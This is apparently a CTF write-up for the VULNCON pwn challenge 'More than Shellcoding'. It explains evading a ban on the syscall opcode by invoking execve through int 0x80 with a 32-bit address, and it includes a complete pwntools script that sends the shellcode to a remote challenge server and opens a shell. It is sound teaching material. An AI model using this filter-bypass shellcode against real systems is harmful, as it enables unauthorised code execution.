# More than Shellcoding / Pwn



This pwn challenge provided you with a binary, you could supply arbitary shellcode to. After further investigation of the binary though, I noticed that the shellcode couldn't contain `0x0f05`, which is the opcode for the `syscall` instruction ...

I thought about other ways of interacting with the system and `int 0x80` came to my attention. It is a way of invoking syscalls on x86 (so 32 bit maschines), but still works on 64bit for backwards compatibility reasons. 

I pushed the string `/bin/sh` to the stack, moved its location into rdi and invoked the [execve syscall](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) (11 in rax). It failed. I used `strace` to find out the error and got `Bad Address` as a reason. I looked more into `int 0x80` on x64 maschines and discovered, that the address may *still* only be 32 bit. So what now?

The Program text. Using `info proc mappings`in gdb I discovered a region in the program text that was readible and writable so  I wrote **/bin/sh** there, then zeroed out ebx and ecx (no argv/environment variables required) and made the syscall. 

We have a shell!

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

# /bin/sh = 0068732f6e69622f

# Having to use 32 bit addresses, so lets write to global
# variables (program text)
SHELLCODE = """
mov rax,0x0068732f6e69622f
mov rbx,0x404000
mov [rbx],rax

mov edi,ebx
mov rax,11

xor ecx,ecx
xor edx,edx

int 0x80

xor rax,rax
inc rax
int 0x80
"""
byte_code = asm(SHELLCODE)
if b"\x0f\x05" in byte_code:
    print("Shellcode contains forbidden instruction")

print("Generated shellcode ...")


#p = process("./More_than_shellcoding")
p = remote("35.228.15.118", 1338)
p.readline()
p.sendline(byte_code)
p.interactive()

print("Done")
```



The flag: **VULNCON{Gu355_u_d0nt_n33d_th3_5y5c4ll_aft3r4ll}**